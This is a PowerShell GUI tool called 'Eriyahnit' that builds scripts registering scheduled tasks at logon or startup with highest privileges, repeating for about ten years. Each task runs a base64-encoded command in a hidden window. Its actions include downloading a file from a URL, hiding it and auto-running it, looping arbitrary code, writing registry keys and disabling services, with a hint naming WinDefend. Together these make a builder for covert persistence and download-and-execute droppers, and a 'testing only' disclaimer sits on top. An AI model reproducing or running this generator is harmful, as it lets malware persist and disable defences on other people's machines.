Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName PresentationCore
Add-Type -AssemblyName WindowsBase
Add-Type -AssemblyName System.Windows.Forms

[xml]$XAML = @"
<Window 
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="Eriyahnit" Height="620" Width="720" Background="#1e1e24" WindowStartupLocation="CenterScreen">
    <Window.Resources>
        <Style TargetType="ScrollViewer">
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="ScrollViewer">
                        <Grid><ScrollContentPresenter/></Grid>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>
    </Window.Resources>
    <Grid Margin="16">
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
            <RowDefinition Height="Auto"/>
        </Grid.RowDefinitions>

        <TextBlock Text="Eriyahnit" Foreground="#00ffcc" FontSize="15" FontWeight="Bold" HorizontalAlignment="Center" Margin="0,0,0,12"/>

        <Grid Grid.Row="1" Margin="0,0,0,12">
            <Grid.ColumnDefinitions>
                <ColumnDefinition Width="*"/>
                <ColumnDefinition Width="16"/>
                <ColumnDefinition Width="*"/>
                <ColumnDefinition Width="16"/>
                <ColumnDefinition Width="*"/>
            </Grid.ColumnDefinitions>
            <StackPanel Grid.Column="0">
                <TextBlock Text="Task Name:" Foreground="#aaaaaa" FontSize="11" Margin="0,0,0,3"/>
                <TextBox Name="txtTaskName" Background="#2d2d38" Foreground="#ffffff" BorderBrush="#3a3a4a" Padding="6"/>
            </StackPanel>
            <StackPanel Grid.Column="2">
                <TextBlock Text="Duration (Seconds):" Foreground="#aaaaaa" FontSize="11" Margin="0,0,0,3"/>
                <TextBox Name="txtTaskDuration" Text="60" Background="#2d2d38" Foreground="#ffffff" BorderBrush="#3a3a4a" Padding="6"/>
            </StackPanel>
            <StackPanel Grid.Column="4">
                <TextBlock Text="Trigger:" Foreground="#aaaaaa" FontSize="11" Margin="0,0,0,3"/>
                <ComboBox Name="cmbTrigger" SelectedIndex="0" Background="#2d2d38" Foreground="#ffffff" BorderBrush="#3a3a4a" Padding="6">
                    <ComboBoxItem Content="AtLogOn" Foreground="#ffffff"/>
                    <ComboBoxItem Content="AtStartup" Foreground="#ffffff"/>
                </ComboBox>
            </StackPanel>
        </Grid>

        <Grid Grid.Row="2">
            <Grid.ColumnDefinitions>
                <ColumnDefinition Width="185"/>
                <ColumnDefinition Width="12"/>
                <ColumnDefinition Width="*"/>
            </Grid.ColumnDefinitions>

            <Border Grid.Column="0" Background="#252530" CornerRadius="8" Padding="10">
                <StackPanel>
                    <TextBlock Text="SELECT ACTION" Foreground="#666680" FontSize="10" FontWeight="Bold" Margin="0,0,0,8"/>
                    <StackPanel Name="pnlMenu"/>
                </StackPanel>
            </Border>

            <Border Grid.Column="2" Background="#252530" CornerRadius="8" Padding="14">
                <ScrollViewer VerticalScrollBarVisibility="Hidden">
                    <StackPanel Name="pnlDetail"/>
                </ScrollViewer>
            </Border>
        </Grid>

        <Button Grid.Row="3" Name="btnGenerate" Content="Generate Script File (.ps1)"
                Background="#00ffcc" Foreground="#1e1e24" FontWeight="Bold"
                Padding="12" Margin="0,12,0,0" Cursor="Hand" FontSize="13"/>
    </Grid>
</Window>
"@

try {
    $Reader = New-Object System.Xml.XmlNodeReader $XAML
    $Form   = [Windows.Markup.XamlReader]::Load($Reader)
} catch {
    [System.Windows.MessageBox]::Show("Form could not be loaded: $_","Error","OK","Error"); exit
}

$txtTaskName   = $Form.FindName("txtTaskName")
$txtTaskDuration = $Form.FindName("txtTaskDuration")
$cmbTrigger    = $Form.FindName("cmbTrigger")
$pnlMenu       = $Form.FindName("pnlMenu")
$pnlDetail     = $Form.FindName("pnlDetail")
$btnGenerate   = $Form.FindName("btnGenerate")

# ################################################### We encode codes with Base64, DO NOT touch this or the code will not work ##################################################
function ConvertTo-EncodedArg($scriptText) {
    $bytes  = [System.Text.Encoding]::Unicode.GetBytes($scriptText)
    $b64    = [Convert]::ToBase64String($bytes)
    return "-WindowStyle Hidden -EncodedCommand $b64"
}

function New-Label($text) {
    $t = New-Object Windows.Controls.TextBlock
    $t.Text = $text; $t.Foreground = [Windows.Media.Brushes]::Gray
    $t.FontSize = 11; $t.Margin = "0,8,0,3"; return $t
}
function New-Box($name, $default="", $height=0) {
    $b = New-Object Windows.Controls.TextBox
    $b.Name = $name; $b.Text = $default
    $b.Background  = [Windows.Media.SolidColorBrush][Windows.Media.ColorConverter]::ConvertFromString("#2d2d38")
    $b.Foreground  = [Windows.Media.Brushes]::White
    $b.BorderBrush = [Windows.Media.SolidColorBrush][Windows.Media.ColorConverter]::ConvertFromString("#3a3a4a")
    $b.Padding = "6"
    $b.CaretBrush = [Windows.Media.SolidColorBrush][Windows.Media.ColorConverter]::ConvertFromString("#00ffcc")
    if ($height -gt 0) { $b.Height = $height; $b.TextWrapping = "Wrap"; $b.AcceptsReturn = $true }
    return $b
}
function New-Combo($name, $items, $sel=0) {
    $c = New-Object Windows.Controls.ComboBox
    $c.Name = $name
    $c.Background  = [Windows.Media.SolidColorBrush][Windows.Media.ColorConverter]::ConvertFromString("#2d2d38")
    $c.Foreground  = [Windows.Media.Brushes]::White
    $c.BorderBrush = [Windows.Media.SolidColorBrush][Windows.Media.ColorConverter]::ConvertFromString("#3a3a4a")
    $c.Padding = "6"

    $itemContainerStyle = New-Object Windows.Style([Windows.Controls.ComboBoxItem])

    $bgSetter = New-Object Windows.Setter
    $bgSetter.Property = [Windows.Controls.Control]::BackgroundProperty
    $bgSetter.Value    = [Windows.Media.SolidColorBrush][Windows.Media.ColorConverter]::ConvertFromString("#2d2d38")

    $fgSetter = New-Object Windows.Setter
    $fgSetter.Property = [Windows.Controls.Control]::ForegroundProperty
    $fgSetter.Value    = [Windows.Media.Brushes]::White

    $itemContainerStyle.Setters.Add($bgSetter)
    $itemContainerStyle.Setters.Add($fgSetter)

    $c.ItemContainerStyle = $itemContainerStyle

    foreach ($i in $items) {
        $ci = New-Object Windows.Controls.ComboBoxItem
        $ci.Content    = $i
        $ci.Foreground = [Windows.Media.Brushes]::White
        $ci.Background = [Windows.Media.SolidColorBrush][Windows.Media.ColorConverter]::ConvertFromString("#2d2d38")
        $c.Items.Add($ci) | Out-Null
    }
    $c.SelectedIndex = $sel; return $c
}
function New-Check($name, $label, $checked=$false) {
    $cb = New-Object Windows.Controls.CheckBox
    $cb.Name = $name; $cb.Content = $label
    $cb.Foreground = [Windows.Media.Brushes]::White
    $cb.IsChecked = $checked; $cb.Margin = "0,4,0,0"; return $cb
}
function New-SectionTitle($text) {
    $t = New-Object Windows.Controls.TextBlock
    $t.Text = $text
    $t.Foreground = [Windows.Media.SolidColorBrush][Windows.Media.ColorConverter]::ConvertFromString("#00ffcc")
    $t.FontSize = 12; $t.FontWeight = "Bold"; $t.Margin = "0,0,0,6"; return $t
}
function New-Hint($text) {
    $t = New-Object Windows.Controls.TextBlock
    $t.Text = $text; $t.TextWrapping = "Wrap"; $t.FontSize = 10; $t.Margin = "0,8,0,0"
    $t.Foreground = [Windows.Media.SolidColorBrush][Windows.Media.ColorConverter]::ConvertFromString("#555570")
    return $t
}

$menuItems = @(
    @{ Label="Run Code";           Icon=">>"; Key="code"      },
    @{ Label="Download File";      Icon="v "; Key="download"  },
    @{ Label="Show Message";       Icon="* "; Key="message"   },
    @{ Label="Show Notification";  Icon="! "; Key="notify"    },
    @{ Label="Open URL";           Icon="@ "; Key="url"       },
    @{ Label="Write Registry";     Icon="# "; Key="registry"  },
    @{ Label="Manage Service";     Icon="~ "; Key="service"   },
    @{ Label="Create File/Folder"; Icon="+ "; Key="file"      }
)

$script:activeKey = "code"
$script:menuBtns = @{}

$script:fnDetail = {
    param($key)
    $script:activeKey = $key
    $pnlDetail.Children.Clear()

    foreach ($k in $script:menuBtns.Keys) {
        if ($k -eq $key) {
            $script:menuBtns[$k].Background  = [Windows.Media.SolidColorBrush][Windows.Media.ColorConverter]::ConvertFromString("#1a3a3a")
            $script:menuBtns[$k].BorderBrush = [Windows.Media.SolidColorBrush][Windows.Media.ColorConverter]::ConvertFromString("#00ffcc")
        } else {
            $script:menuBtns[$k].Background  = [Windows.Media.Brushes]::Transparent
            $script:menuBtns[$k].BorderBrush = [Windows.Media.Brushes]::Transparent
        }
    }

    switch ($key) {
        "code" {
            $pnlDetail.Children.Add((New-SectionTitle "Run Code")) | Out-Null
            $pnlDetail.Children.Add((New-Label "PowerShell Code to Execute:")) | Out-Null
            $script:txtCode = New-Box "txtCode" "Get-ChildItem C:\ | Out-File 'C:\result.txt'; Start-Process notepad.exe 'C:\result.txt'" 120
            $script:txtCode.FontFamily = "Consolas"
            $script:txtCode.Foreground = [Windows.Media.SolidColorBrush][Windows.Media.ColorConverter]::ConvertFromString("#00ff80")
            $pnlDetail.Children.Add($script:txtCode) | Out-Null
            $pnlDetail.Children.Add((New-Hint "Tip: You can write separate commands on each line. Use single quotes for file paths.")) | Out-Null
        }
        "download" {
            $pnlDetail.Children.Add((New-SectionTitle "Download File")) | Out-Null
            $pnlDetail.Children.Add((New-Label "Download URL:")) | Out-Null
            $script:txtURL = New-Box "txtURL" "https://example.com/file.exe"
            $pnlDetail.Children.Add($script:txtURL) | Out-Null
            $pnlDetail.Children.Add((New-Label "Full Save Path:")) | Out-Null
            $script:txtTarget = New-Box "txtTarget" "C:\Users\Public\file.exe"
            $pnlDetail.Children.Add($script:txtTarget) | Out-Null
            $script:chkRun = New-Check "chkRun" "Auto-run after download completes"
            $pnlDetail.Children.Add($script:chkRun) | Out-Null
            $script:chkHide = New-Check "chkHide" "Make file hidden"
            $pnlDetail.Children.Add($script:chkHide) | Out-Null
        }
        "message" {
            $pnlDetail.Children.Add((New-SectionTitle "Show Message")) | Out-Null
            $pnlDetail.Children.Add((New-Label "Message Title:")) | Out-Null
            $script:txtMsgTitle = New-Box "txtMsgTitle" "Info"
            $pnlDetail.Children.Add($script:txtMsgTitle) | Out-Null
            $pnlDetail.Children.Add((New-Label "Message Content:")) | Out-Null
            $script:txtMsgBody = New-Box "txtMsgBody" "Task completed successfully!" 80
            $pnlDetail.Children.Add($script:txtMsgBody) | Out-Null
            $pnlDetail.Children.Add((New-Label "Icon Type:")) | Out-Null
            $script:cboIcon = New-Combo "cboIcon" @("Information","Warning","Error","Question")
            $pnlDetail.Children.Add($script:cboIcon) | Out-Null
            $pnlDetail.Children.Add((New-Hint "Note: Message box may not work on all computers due to Session 0 isolation without RunLevel.")) | Out-Null
        }
        "notify" {
            $pnlDetail.Children.Add((New-SectionTitle "Windows Notification (Balloon Tip)")) | Out-Null
            $pnlDetail.Children.Add((New-Label "Notification Title:")) | Out-Null
            $script:txtNotifyTitle = New-Box "txtNotifyTitle" "System Notification"
            $pnlDetail.Children.Add($script:txtNotifyTitle) | Out-Null
            $pnlDetail.Children.Add((New-Label "Notification Text:")) | Out-Null
            $script:txtNotifyText = New-Box "txtNotifyText" "Scheduled task has run." 60
            $pnlDetail.Children.Add($script:txtNotifyText) | Out-Null
            $pnlDetail.Children.Add((New-Label "Duration (seconds):")) | Out-Null
            $script:txtNotifyDuration = New-Box "txtNotifyDuration" "5"
            $pnlDetail.Children.Add($script:txtNotifyDuration) | Out-Null
            $pnlDetail.Children.Add((New-Hint "Note: Notification may not work on all computers due to Session 0 isolation without RunLevel.")) | Out-Null
        }
        "url" {
            $pnlDetail.Children.Add((New-SectionTitle "Open URL")) | Out-Null
            $pnlDetail.Children.Add((New-Label "URL to Open:")) | Out-Null
            $script:txtOpenURL = New-Box "txtOpenURL" "https://www.google.com"
            $pnlDetail.Children.Add($script:txtOpenURL) | Out-Null
            $pnlDetail.Children.Add((New-Label "Browser:")) | Out-Null
            $script:cboBrowser = New-Combo "cboBrowser" @("Default Browser","chrome.exe","firefox.exe","msedge.exe","iexplore.exe")
            $pnlDetail.Children.Add($script:cboBrowser) | Out-Null
            $pnlDetail.Children.Add((New-Hint "Note: Browser may not work on all computers due to Session 0 isolation without RunLevel.")) | Out-Null
        }
        "registry" {
            $pnlDetail.Children.Add((New-SectionTitle "Write Registry")) | Out-Null
            $pnlDetail.Children.Add((New-Label "Root (Hive):")) | Out-Null
            $script:cboHive = New-Combo "cboHive" @("HKLM:\","HKCU:\","HKCR:\","HKU:\","HKCC:\")
            $pnlDetail.Children.Add($script:cboHive) | Out-Null
            $pnlDetail.Children.Add((New-Label "Path:")) | Out-Null
            $script:txtRegPath = New-Box "txtRegPath" "SOFTWARE\MyApp\Settings"
            $pnlDetail.Children.Add($script:txtRegPath) | Out-Null
            $pnlDetail.Children.Add((New-Label "Value Name:")) | Out-Null
            $script:txtRegName = New-Box "txtRegName" "MyValue"
            $pnlDetail.Children.Add($script:txtRegName) | Out-Null
            $pnlDetail.Children.Add((New-Label "Value (Data):")) | Out-Null
            $script:txtRegData = New-Box "txtRegData" "1"
            $pnlDetail.Children.Add($script:txtRegData) | Out-Null
            $pnlDetail.Children.Add((New-Label "Type:")) | Out-Null
            $script:cboRegType = New-Combo "cboRegType" @("String","DWord","QWord","Binary","MultiString","ExpandString")
            $pnlDetail.Children.Add($script:cboRegType) | Out-Null
            $script:chkRegCreate = New-Check "chkRegCreate" "Auto-create path if it doesn't exist" $true
            $pnlDetail.Children.Add($script:chkRegCreate) | Out-Null
        }
        "service" {
            $pnlDetail.Children.Add((New-SectionTitle "Manage Service")) | Out-Null
            $pnlDetail.Children.Add((New-Label "Service Name:")) | Out-Null
            $script:txtServiceName = New-Box "txtServiceName" "wuauserv"
            $pnlDetail.Children.Add($script:txtServiceName) | Out-Null
            $pnlDetail.Children.Add((New-Label "Action:")) | Out-Null
            $script:cboServiceAction = New-Combo "cboServiceAction" @("Start","Stop","Restart","Disable","Enable")
            $pnlDetail.Children.Add($script:cboServiceAction) | Out-Null
            $script:chkServiceSilent = New-Check "chkServiceSilent" "Continue silently on error" $true
            $pnlDetail.Children.Add($script:chkServiceSilent) | Out-Null
            $pnlDetail.Children.Add((New-Hint "Tip: wuauserv=Windows Update  spooler=Printer  WinDefend=Defender")) | Out-Null
        }
        "file" {
            $pnlDetail.Children.Add((New-SectionTitle "Create File / Folder")) | Out-Null
            $pnlDetail.Children.Add((New-Label "Folder Path:")) | Out-Null
            $script:txtFileFolder = New-Box "txtFileFolder" "C:\MyFolder"
            $pnlDetail.Children.Add($script:txtFileFolder) | Out-Null
            $pnlDetail.Children.Add((New-Label "File Name (leave empty to create only folder):")) | Out-Null
            $script:txtFileName2 = New-Box "txtFileName2" "note.txt"
            $pnlDetail.Children.Add($script:txtFileName2) | Out-Null
            $pnlDetail.Children.Add((New-Label "File Content:")) | Out-Null
            $script:txtFileContent = New-Box "txtFileContent" "Hello World!" 70
            $pnlDetail.Children.Add($script:txtFileContent) | Out-Null
        }
    }
}

foreach ($item in $menuItems) {
    $btn = New-Object Windows.Controls.Button
    $btn.Content = "$($item.Icon)  $($item.Label)"
    $btn.Background = [Windows.Media.Brushes]::Transparent
    $btn.Foreground = [Windows.Media.Brushes]::White
    $btn.BorderThickness = "1"
    $btn.BorderBrush = [Windows.Media.Brushes]::Transparent
    $btn.HorizontalContentAlignment = "Left"
    $btn.Padding = "8,6"; $btn.Margin = "0,2"
    $btn.Cursor = "Hand"; $btn.FontSize = 12
    $btn.Tag = $item.Key
    $btn.Add_Click({
        $k = $this.Tag
        & $script:fnDetail $k
    })
    $script:menuBtns[$item.Key] = $btn
    $pnlMenu.Children.Add($btn) | Out-Null
}

& $script:fnDetail "code"

$btnGenerate.Add_Click({
    if ([string]::IsNullOrWhiteSpace($txtTaskName.Text)) {
        [System.Windows.MessageBox]::Show("Task name cannot be empty!","Error","OK","Error"); return
    }

    $taskName  = $txtTaskName.Text
    $taskDuration = [int]$txtTaskDuration.Text
    $triggerIdx = $cmbTrigger.SelectedIndex
    $minutes   = [math]::Max(1, [math]::Round($taskDuration / 60))
    $triggerCode = if ($triggerIdx -eq 0) { "AtLogOn" } else { "AtStartup" }

    # ############################################################# PS script text is generated for each action ####################################  
    switch ($script:activeKey) {

        "code" {
            $scriptText = @"
while (`$true) {
    Start-Sleep -Seconds $taskDuration
    $($script:txtCode.Text)
}
"@
            $runLevel    = "-RunLevel Highest"
            $repeatTrigger = $false
        }

        "download" {
            $url    = $script:txtURL.Text
            $target = $script:txtTarget.Text
            $extra  = ""
            if ($script:chkHide.IsChecked)    { $extra += "`n(Get-Item '$target').Attributes = 'Hidden'" }
            if ($script:chkRun.IsChecked) { $extra += "`nStart-Process '$target'" }
            $scriptText = "Invoke-WebRequest -Uri '$url' -OutFile '$target'$extra"
            $runLevel    = "-RunLevel Highest"
            $repeatTrigger = $true
        }

        "message" {
            $title = $script:txtMsgTitle.Text
            $body  = $script:txtMsgBody.Text
            $icon  = $script:cboIcon.Text
            $scriptText = @"
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show('$body', '$title', 'OK', '$icon')
"@
            $runLevel    = ""
            $repeatTrigger = $true
        }

        "notify" {
            $nTitle = $script:txtNotifyTitle.Text
            $nText  = $script:txtNotifyText.Text
            $nDuration = [int]$script:txtNotifyDuration.Text
            $ms      = $nDuration * 1000
            $wait    = $nDuration + 2
            $scriptText = @"
while (`$true) {
    Start-Sleep -Seconds $taskDuration
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    `$n = New-Object System.Windows.Forms.NotifyIcon
    `$n.Icon    = [System.Drawing.SystemIcons]::Information
    `$n.Visible = `$true
    `$n.ShowBalloonTip($ms, '$nTitle', '$nText', [System.Windows.Forms.ToolTipIcon]::Info)
    Start-Sleep -Seconds $wait
    `$n.Dispose()
}
"@
            $runLevel    = ""
            $repeatTrigger = $false
        }

        "url" {
            $openURL    = $script:txtOpenURL.Text
            $browser = $script:cboBrowser.Text
            $scriptText = if ($browser -eq "Default Browser") {
                "Start-Process '$openURL'"
            } else {
                "Start-Process '$browser' '$openURL'"
            }
            $runLevel    = ""
            $repeatTrigger = $true
        }

        "registry" {
            $hive   = $script:cboHive.Text
            $path   = $script:txtRegPath.Text
            $name   = $script:txtRegName.Text
            $data   = $script:txtRegData.Text
            $type   = $script:cboRegType.Text
            $createLine = if ($script:chkRegCreate.IsChecked) {
                "if (!(Test-Path '${hive}${path}')) { New-Item -Path '${hive}${path}' -Force | Out-Null }"
            } else { "" }
            $scriptText = @"
$createLine
Set-ItemProperty -Path '${hive}${path}' -Name '$name' -Value '$data' -Type $type
"@
            $runLevel    = "-RunLevel Highest"
            $repeatTrigger = $true
        }

        "service" {
            $sName   = $script:txtServiceName.Text
            $sIdx    = $script:cboServiceAction.SelectedIndex
            $silent = if ($script:chkServiceSilent.IsChecked) { " -ErrorAction SilentlyContinue" } else { "" }
            $scriptText = @(
                "Start-Service -Name '$sName'$silent",
                "Stop-Service -Name '$sName'$silent",
                "Restart-Service -Name '$sName'$silent",
                "Set-Service -Name '$sName' -StartupType Disabled$silent",
                "Set-Service -Name '$sName' -StartupType Automatic$silent"
            )[$sIdx]
            $runLevel    = "-RunLevel Highest"
            $repeatTrigger = $true
        }

        "file" {
            $folder  = $script:txtFileFolder.Text
            $fileName = $script:txtFileName2.Text.Trim()
            $content  = $script:txtFileContent.Text
            if ([string]::IsNullOrWhiteSpace($fileName)) {
                $scriptText = "if (!(Test-Path '$folder')) { New-Item -Path '$folder' -ItemType Directory -Force | Out-Null }"
            } else {
                $scriptText = @"
if (!(Test-Path '$folder')) { New-Item -Path '$folder' -ItemType Directory -Force | Out-Null }
Set-Content -Path '$folder\$fileName' -Value '$content'
"@
            }
            $runLevel    = "-RunLevel Highest"
            $repeatTrigger = $true
        }
    }

    $encodedBytes = [System.Text.Encoding]::Unicode.GetBytes($scriptText)
    $encodedCmd   = [Convert]::ToBase64String($encodedBytes)
    $argLine    = "-WindowStyle Hidden -EncodedCommand $encodedCmd"

    $triggerLine = if ($triggerIdx -eq 0) {
        "`$trigger1 = New-ScheduledTaskTrigger -AtLogOn"
    } else {
        "`$trigger1 = New-ScheduledTaskTrigger -AtStartup"
    }

    if ($repeatTrigger) {
        $triggerBlock  = "$triggerLine`n`$trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes $minutes) -RepetitionDuration (New-TimeSpan -Days 3650)"
        $triggerParam = "`$trigger1,`$trigger2"
    } else {
        $triggerBlock  = $triggerLine
        $triggerParam = "`$trigger1"
    }

    ########################################################## Content of the ps1 file #####################################################################
    $ps1Content = @"
# This script was generated by Eriyahnit, please use it for testing purposes only
# Task Name  : $taskName
# Action Type: $($script:activeKey)
# Generated  : $(Get-Date -Format 'dd.MM.yyyy HH:mm')
# Note       : All responsibility for misuse lies with the user

`$taskName = "$taskName"

`$action   = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "$argLine"

$triggerBlock

`$settings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit (New-TimeSpan -Days 0)

Register-ScheduledTask -TaskName `$taskName -Action `$action -Trigger $triggerParam -Settings `$settings $runLevel -Force

Write-Host "Task '$taskName' has been created successfully." -ForegroundColor Green
"@

    $dlg          = New-Object System.Windows.Forms.SaveFileDialog
    $dlg.Filter   = "PowerShell Script (*.ps1)|*.ps1"
    $dlg.FileName = "${taskName}_task.ps1"
    if ($dlg.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK) {
        [System.IO.File]::WriteAllText($dlg.FileName, $ps1Content, [System.Text.Encoding]::UTF8)
        [System.Windows.MessageBox]::Show("File saved:`n$($dlg.FileName)","Success","OK","Information")
        $Form.Close()
    }
})

$Form.ShowDialog() | Out-Null